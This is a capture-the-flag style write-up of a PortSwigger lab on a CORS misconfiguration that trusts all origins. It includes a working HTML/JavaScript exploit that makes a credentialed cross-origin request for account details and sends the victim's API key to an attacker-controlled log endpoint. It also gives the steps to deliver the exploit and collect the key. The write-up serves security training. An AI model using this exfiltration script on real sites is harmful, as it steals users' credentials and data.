# Cross-origin resource sharing (CORS)

> Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

## Lab 1 : CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Sol :

* Log in and access the account page with the `wiener:peter` credentials.

* Go to `http history` and observe that out key is retrieved via an request to `/accountDetails` and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/7996a544-582b-4347-aeb8-9d12fe6e9b6c)

* Send it to the Burp Repeater

* Add header `Origin` and give a example website to check the response

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1aa6a719-0d7d-487c-9cf7-d01edcf86d7d)

* Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
* Click on `Go to exploit server` in the lab.
* Give the below script in the body box by giving lab ID of yours.

      <html>
      <body>
          <h1>Hello World!</h1>
          <script>
              var xhr = new XMLHttpRequest();
              var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net"
              xhr.onreadystatechange = function() {
                  if (xhr.readyState == XMLHttpRequest.DONE){
                      fetch("/log?key=" + xhr.responseText)
                  }
              }

              xhr.open('GET', url + "/accountDetails", true);
              xhr.withCredentials = true;
              xhr.send(null)
          </script>
        </body>
      </html>
      
 * Click `View exploit`. Observe that the exploit works - you have landed on the log page and your API key is in the URL
* Go back to the exploit server and click `Deliver exploit to victim`
* Click `Access log`, retrieve and submit the victim's API key to complete the lab.
* Thus, the lab is solved
